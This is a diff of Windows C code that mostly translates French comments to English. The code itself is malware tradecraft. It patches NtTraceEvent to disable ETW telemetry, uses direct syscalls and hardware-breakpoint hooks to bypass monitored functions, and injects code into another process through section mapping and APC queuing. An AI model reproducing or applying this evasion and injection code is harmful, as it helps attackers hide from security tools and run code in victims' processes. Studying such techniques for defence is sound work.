@@ -191,7 +191,6 @@ BOOL RemoveETWEvent(HMODULE hModule) {
 	if (!pNtTraceEvent)
 		return FALSE;
 
-	// Cherche le SSN
 	for (int i = 0; i < 0x20; i++) {
 		if (pNtTraceEvent[i] == MOVE_EAX_imm32_OPCODE) {
 			pNtTraceEvent = &pNtTraceEvent[i + 1];
@@ -201,7 +200,7 @@ BOOL RemoveETWEvent(HMODULE hModule) {
 			return FALSE;
 	}
 
-	void* pvoidNtTraceEvent = (void*)pNtTraceEvent; // <- ici après GetProcAddress
+	void* pvoidNtTraceEvent = (void*)pNtTraceEvent;
 	UINT sizet = sizeof(DWORD);
 
 	SYSCALL(S.NtProtectVirtualMemory);
@@ -212,7 +211,7 @@ BOOL RemoveETWEvent(HMODULE hModule) {
 
 	*(PDWORD)pNtTraceEvent = 0x000000FF; // Patch
 
-	// Remet les permissions initiales
+	// Reset perms
 	if (!VirtualProtect(pNtTraceEvent, sizeof(DWORD), dwOldProtection, &dwOldProtection)) {
 		printf("[!] VirtualProtect failed with error %d\n", GetLastError());
 		return FALSE;
@@ -223,7 +222,7 @@ BOOL RemoveETWEvent(HMODULE hModule) {
 
 
 HANDLE GiveMeMyProcessHandle(WCHAR* ProcessName, OUT int* PID) {
-	PSYSTEM_PROCESS_INFORMATION entry = sProcInfo;  // pointeur local
+	PSYSTEM_PROCESS_INFORMATION entry = sProcInfo;
 	HANDLE hPID = NULL;
 	NTSTATUS status;
 	OBJECT_ATTRIBUTES objAttr;
@@ -352,7 +351,7 @@ BOOL SetHardwareBreakingPnt(IN PVOID pAddress, IN PVOID fnHookFunc, IN enum DRX 
 		return FALSE;
 
 	// Get local thread context
-	if (!GetThreadContext((HANDLE)-2, &ThreadCtx)) // -2 pour spécifier le thread local
+	if (!GetThreadContext((HANDLE)-2, &ThreadCtx)) // -2 for local thread
 		return FALSE;
 
 	// Sets the value of the Dr0-3 registers 
@@ -442,28 +441,27 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 		PCONTEXT ctx = pExceptionInfo->ContextRecord;
 		enum DRX triggered = -1;
 
-		// On détecte quel DRx a sauté
 		if (exceptionAddress == (PVOID)ctx->Dr0) triggered = DR0;
 		else if (exceptionAddress == (PVOID)ctx->Dr1) triggered = DR1;
 		else if (exceptionAddress == (PVOID)ctx->Dr2) triggered = DR2;
 		else if (exceptionAddress == (PVOID)ctx->Dr3) triggered = DR3;
 
 		if (triggered >= DR0 && triggered <= DR2) {
-			// Désactive le HW BP pour éviter la récursion
+
 			RemoveHardwareBreakingPnt(triggered);
 
 			switch (triggered) {
 			case DR0:
 				//-----------------------------
-				// Mapping de la section
+				// Mapping of section
 				//-----------------------------
 				// RCX = &hSection
 				// RDX = &pBaseSection
-				// R8  = hProcess (ton handle valide)
+				// R8  = hProcess
 				ctx->Rcx = (ULONG_PTR)&hSection;
 				ctx->Rdx = (ULONG_PTR)&pBaseSection;
 				ctx->R8 = (ULONG_PTR)hProcess;
-				// Appel en C
+			
 				if (!SettingMap(&hSection, &pBaseSection, hProcess))
 					RETURN_VALUE(ctx, FALSE);
 				else
@@ -472,7 +470,7 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 
 			case DR1:
 				//-----------------------------
-				// Queue APC sur un thread alerte
+				// Queue APC on alertable thread
 				//-----------------------------
 				// RCX = PID
 				// RDX = pBaseSection
@@ -486,7 +484,7 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 
 			case DR2:
 				//-----------------------------
-				// Injecter manuellement via SleepEx APC
+				// Manual injection via SleepEx APC
 				//-----------------------------
 				// RCX = hProcess
 				// RDX = pBaseSection
@@ -499,7 +497,7 @@ LONG WINAPI VectorHandler(PEXCEPTION_POINTERS pExceptionInfo) {
 				break;
 			}
 
-			// on saute l’instruction d’origine et on retourne
+			// Bypass Hooked function
 			BLOCK_REAL(ctx);
 			return EXCEPTION_CONTINUE_EXECUTION;
 		}
